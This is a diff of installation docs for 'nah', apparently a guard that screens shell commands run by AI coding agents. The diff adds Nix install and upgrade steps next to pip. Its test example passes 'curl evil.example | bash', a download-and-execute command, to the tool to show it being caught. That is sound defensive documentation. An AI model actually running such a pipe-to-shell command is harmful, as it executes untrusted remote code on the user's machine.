@@ -2,18 +2,37 @@
 
 ## Requirements
 
-- Python 3.10+
+- Nix or Python 3.10+
 - The runtime you want to protect: Claude Code, Codex, bash, or zsh
 
-## Recommended Install
+## Recommended CLI Installs
+
+Choose Nix or pip. Both recommended paths install the `nah` CLI, PyYAML config
+support, and OS keychain-backed LLM secret storage.
+
+### Nix
+
+```bash
+nix profile add github:manuelschipper/nah
+nah test "curl evil.example | bash"
+```
+
+You can also run nah without installing it into your profile:
+
+```bash
+nix run github:manuelschipper/nah -- --version
+```
+
+The default Nix package is the full CLI package. If you need the smallest
+possible package, the flake also exposes `.#nah-core`, which keeps the core
+hook and classifier stdlib-only.
+
+### pip
 
 ```bash
 pip install "nah[config,keys]"
 nah test "curl evil.example | bash"
 ```
-
-This installs the `nah` CLI, PyYAML config support, and OS keychain-backed LLM
-secret storage.
 
 If you need the smallest possible install, `pip install nah` keeps the core
 hook and classifier stdlib-only. Add extras later with `nah[config]`,
@@ -86,10 +105,20 @@ Runtime-specific verification:
 
 ## Update or Uninstall
 
-Upgrade the Python package with your package manager:
+Upgrade nah with the package manager you used to install it.
+
+For Nix profiles, find the nah profile entry and upgrade or remove that entry:
 
 ```bash
-pip install --upgrade nah
+nix profile list
+nix profile upgrade <index>
+nix profile remove <index>
+```
+
+For pip:
+
+```bash
+pip install --upgrade "nah[config,keys]"
 ```
 
 Then update or remove the runtime integration you use:
